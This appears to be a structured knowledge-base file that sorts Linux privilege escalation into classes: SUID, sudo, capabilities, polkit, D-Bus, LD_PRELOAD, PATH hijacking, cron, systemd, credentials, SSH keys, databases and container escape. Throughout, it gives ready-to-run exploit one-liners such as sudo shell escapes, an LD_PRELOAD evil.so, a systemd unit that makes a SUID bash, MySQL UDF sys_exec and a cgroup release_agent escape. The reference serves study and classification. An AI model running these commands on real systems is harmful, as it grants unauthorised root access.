_description: PrivEscalate Taxonomy Knowledge Base - 14 sub-categories across 5 classes for Linux privilege escalation
_source: MITRE ATT&CK (TA0004 seed with cross-tactic Linux mappings) + CWE + GTFOBins + Exploit-DB + PayloadsAllTheThings

A1_suid_sgid.name: SUID/SGID abuse
A1_suid_sgid.attack_technique_name: Abuse Elevation Control Mechanism: Setuid and Setgid
A1_suid_sgid.description: Exploiting Unix binaries that have the SUID or SGID bit set, allowing execution with the file owner's (typically root) privileges. The attacker finds a SUID binary that can be abused to spawn a shell, read/write arbitrary files, or execute arbitrary commands as root.
typical_exploit_patterns: Shell escape: binary -exec /bin/sh -p (find, nmap --interactive)
File read: binary reads /etc/shadow -> offline crack -> su root
File write: binary writes to /etc/passwd -> add root user
Custom binary with insecure system() call -> command injection
Shared object injection via SUID binary with writable RPATH

examples.note: file-read, indirect privesc via password cracking

A2_sudo.name: Sudo misconfiguration
A2_sudo.attack_technique_name: Abuse Elevation Control Mechanism: Sudo and Sudo Caching
A2_sudo.description: Exploiting misconfigured sudoers rules that allow a low-privileged user to run specific binaries as root without a password, or with overly permissive arguments. Includes sudo version-specific CVEs (e.g., CVE-2019-14287 uid=-1 bypass) and GTFOBins shell escapes via sudo-allowed editors/interpreters.
typical_exploit_patterns: Shell escape: sudo binary -> interactive mode -> !/bin/sh (less, man, vi)
NOPASSWD on interpreters: sudo python3 -c 'import os; os.system("/bin/bash")'
env_keep+=LD_PRELOAD: compile malicious .so, sudo LD_PRELOAD=./evil.so binary
CVE-2019-14287: sudo -u#-1 /bin/bash (uid overflow to root)
CVE-2021-3156 (Baron Samedit): heap overflow in sudoedit

A3_capabilities.name: Capabilities abuse
A3_capabilities.description: Exploiting Linux capabilities assigned to binaries that grant partial root powers. Capabilities like CAP_SETUID allow a binary to change its UID to root, CAP_DAC_READ_SEARCH bypasses file read permissions, and CAP_NET_RAW enables raw socket operations. An overly granted capability on an interpreter or utility can be leveraged for full root escalation.
typical_exploit_patterns: CAP_SETUID on interpreter: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
CAP_DAC_READ_SEARCH: binary reads /etc/shadow -> offline cracking
CAP_SETUID on compiled binary: craft binary to call setuid(0)+execve
CAP_SYS_PTRACE: attach to root process and inject shellcode

A4_polkit.name: Polkit misconfiguration
A4_polkit.description: Exploiting PolicyKit (polkit) misconfigurations or vulnerabilities that allow unprivileged users to perform privileged D-Bus actions. Includes CVE-2021-4034 (PwnKit, pkexec memory corruption) and misconfigured polkit rules that grant broad administrative access without proper authentication checks.
typical_exploit_patterns: CVE-2021-4034 (PwnKit): pkexec argv[0] manipulation -> arbitrary code as root
Misconfigured polkit rules: allow_any=yes on org.freedesktop.* actions
pkexec with vulnerable SUID: exploit pkexec binary directly
D-Bus activated polkit agents with weak authentication

A5_dbus.name: D-Bus misconfiguration
A5_dbus.description: Exploiting misconfigured D-Bus services that expose privileged operations to unprivileged users. D-Bus system services running as root may accept method calls without proper authentication or authorization checks, allowing an attacker to trigger privileged actions like package installation, service management, or arbitrary command execution.
typical_exploit_patterns: Unauthenticated method calls: dbus-send to privileged service without auth checks
Exploiting exposed CreateUser/InstallPackage methods on system bus services
AccountsService CreateUser: dbus-send to create user with admin privileges
Service with shell execution via D-Bus properties or method arguments

examples.note: creates admin user via exposed D-Bus method

B1_ld_preload.name: LD_PRELOAD hijack
B1_ld_preload.attack_technique_name: Hijack Execution Flow: Dynamic Linker Hijacking
B1_ld_preload.description: Exploiting the LD_PRELOAD environment variable or related dynamic linker mechanisms (ld.so.preload, LD_LIBRARY_PATH) to inject a malicious shared library into a privileged process. When sudo is configured with env_keep+=LD_PRELOAD, or a SUID binary loads libraries from a writable path, the attacker can execute arbitrary code with elevated privileges.
typical_exploit_patterns: sudo env_keep+=LD_PRELOAD: compile evil.so with __attribute__((constructor)), sudo LD_PRELOAD=./evil.so <allowed_binary>
Writable /etc/ld.so.preload: add path to malicious .so loaded by all SUID binaries
Missing shared library: SUID binary tries to load non-existent .so from writable dir
LD_LIBRARY_PATH with SUID: replace a dependency .so in a writable search path

examples.cmd: gcc -shared -fPIC -o evil.so evil.c -nostartfiles && sudo LD_PRELOAD=./evil.so apache2

B2_path_hijack.name: PATH hijacking
B2_path_hijack.attack_technique_name: Hijack Execution Flow: Path Interception by PATH Environment Variable
B2_path_hijack.description: Exploiting privileged scripts or binaries that invoke commands using relative paths instead of absolute paths. By placing a malicious binary earlier in the PATH or in a writable directory that precedes the legitimate binary, the attacker hijacks execution when the privileged process calls the unqualified command name.
enumeration_commands: cat /etc/crontab (look for scripts using relative commands)
typical_exploit_patterns: SUID binary calls system('service restart'): create /tmp/service with /bin/bash payload, prepend /tmp to PATH
Cron script uses 'cp' without /bin/cp: place malicious 'cp' in writable PATH dir
Sudo script with relative imports: hijack command called within sudoed script
Custom SUID C binary with system() call using relative path

examples.note: cron script calls 'tar' with relative path

A6_weak_permissions.name: Weak file permissions
A6_weak_permissions.attack_technique_name: File and Directory Permissions Modification: Linux and Mac Permissions
A6_weak_permissions.cwe_name: Incorrect Permission Assignment for Critical Resource
A6_weak_permissions.description: World-writable system password files allow a low-privilege user to alter root authentication data and obtain UID-0 access.
typical_exploit_patterns: Append a UID-0 account to a world-writable /etc/passwd
Clear or replace the root password entry in a world-writable /etc/shadow

C1_cron.name: Cron job exploitation
C1_cron.cwe_name: Incorrect Permission Assignment for Critical Resource
C1_cron.description: Exploiting cron jobs that run as root but reference world-writable scripts, directories with weak permissions, or scripts that can be modified by the attacker. The attacker modifies the cron-executed script to include a reverse shell or SUID copy of bash, then waits for the cron job to execute.
typical_exploit_patterns: World-writable cron script: append reverse shell or SUID bash copy command
Cron script in writable directory: replace script entirely
Cron job PATH manipulation: cron uses custom PATH, place malicious binary first
Overwrite cron script dependency: if cron script sources another file
Writable cron.d directory: add new cron job file

examples.note: replace cron script with reverse shell

C2_systemd.name: Systemd service
C2_systemd.attack_technique_name: Create or Modify System Process: Systemd Service
C2_systemd.cwe_name: Incorrect Permission Assignment for Critical Resource
C2_systemd.description: Exploiting a systemd service unit with weak file permissions or a misconfigured ExecStart directive. If the unit file or the script it references is writable by a low-privileged user, they can modify it to execute arbitrary commands as root when the service loads.
typical_exploit_patterns: Writable service unit: modify ExecStart to run malicious command
Writable ExecStart script: replace referenced script with payload
Service with writable environment file: inject malicious env variables

examples.cmd: echo -e '[Service]\nType=oneshot\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"' > /etc/systemd/system/evil.service && systemctl daemon-reload && systemctl start evil

D1_credential.name: Password disclosure
D1_credential.attack_technique_name: Unsecured Credentials: Credentials In Files / Shell History
D1_credential.description: Discovering plaintext or weakly protected credentials stored in files, environment variables, command history, configuration files, or process memory. The attacker finds root or privileged user passwords/tokens and uses them to escalate via su, sudo, or service authentication.
typical_exploit_patterns: Plaintext passwords in config files: /etc/*, /opt/*/config*, .env files
Command history: bash_history contains 'mysql -p<password>' or 'su <password>'
Backup files: .bak, .old, .swp files containing credentials
Environment variables: process environ leaking DB/API passwords
Readable /etc/shadow: direct access to password hashes -> offline cracking

examples.cmd: su root (with discovered password from config file)

D2_ssh_key.name: SSH key injection
D2_ssh_key.description: Exploiting a writable authorized_keys file attached to a privileged account to inject the attacker's public key. The attacker then uses the matching private key to SSH as the privileged user.
typical_exploit_patterns: Readable root SSH key: cat /root/.ssh/id_rsa -> ssh -i root@localhost
Writable authorized_keys: echo attacker_pubkey >> /root/.ssh/authorized_keys
SSH key in backup/web directory: found in /var/backups/, /var/www/, /tmp/
SSH key with weak passphrase: ssh2john + hashcat/john for cracking

D3_database.name: DB credential privesc
D3_database.description: Exploiting database services (MySQL, PostgreSQL) running as root or with elevated privileges where the attacker discovers database credentials and leverages database-specific features for privilege escalation. Includes MySQL UDF (User-Defined Function) loading to execute OS commands, PostgreSQL COPY program execution, or using discovered DB credentials that match system user passwords.
typical_exploit_patterns: MySQL UDF: load raptor_udf2.so -> CREATE FUNCTION sys_exec -> SELECT sys_exec('chmod +s /bin/bash')
PostgreSQL COPY PROGRAM: COPY (SELECT '') TO PROGRAM 'id' (requires superuser)
MySQL FILE privilege: SELECT LOAD_FILE('/etc/shadow'); or INTO OUTFILE to write webshell
Credential reuse: DB root password matches system root password -> su root

examples.cmd: mysql -u root -p<found_pass> -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so'; SELECT sys_exec('chmod +s /bin/bash');"
su root (using password found in /var/www/html/config.php DB_PASSWORD)

E1_docker_escape.name: Docker/container escape
E1_docker_escape.description: Escaping from a Docker container to the host system or escalating privileges within a container by exploiting misconfigured Docker settings. Includes abusing mounted Docker socket, privileged containers, excessive capabilities, sensitive host mounts, or Docker group membership to gain root access on the host.
typical_exploit_patterns: Docker socket mount: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Privileged container: mount host disk, chroot to host filesystem
Docker group: user in docker group can mount host filesystem via docker run
CAP_SYS_ADMIN in container: mount host cgroup, write release_agent for escape
Exposed Docker API: curl http://localhost:2375/containers/json -> create privileged container

examples.cmd: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release && echo '#!/bin/sh\nps aux > /output' > /cmd && echo '/cmd' > /tmp/cgrp/release_agent
